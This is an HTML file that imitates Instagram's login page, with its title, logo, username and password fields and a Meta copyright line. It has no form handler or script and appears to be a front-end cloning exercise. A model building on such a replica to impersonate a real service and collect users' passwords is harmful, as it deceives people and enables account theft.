
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>Instagram – Login</title>
  <link rel="stylesheet" href="login.css">
</head>
<body>

  <div class="container">
    <div class="left">
      <div class="promo">
        <div class="logo">
          <svg xmlns="http://www.w3.org/2000/svg" width="48" height="48"
               fill="none" stroke="white" stroke-width="1.5"
               viewBox="0 0 16 16">
            <rect x="1.5" y="1.5" width="13" height="13" rx="3"/>
            <circle cx="8" cy="8" r="3"/>
            <circle cx="12.2" cy="3.8" r="0.8"/>
          </svg>
        </div>

        <h1>See everyday moments from your<br>
          <span>close friends.</span>
        </h1>

        <div class="cards">
          <img src=""
               alt="story">
        </div>
      </div>
    </div>

    <div class="right">
      <div class="login-box">
        <h2>Log into Instagram</h2>

        <input type="text" placeholder="Mobile number, username or email" required>
        <input type="password" placeholder="Password" required>

        <button class="login-btn">Log in</button>

        <a href="#" class="forgot">Forgot password?</a>

        <button class="fb-btn">Log in with Facebook</button>
        <button class="signup-btn">Create new account</button>

        <p class="meta">© Meta</p>
      </div>
    </div>

  </div>

</body>
</html>
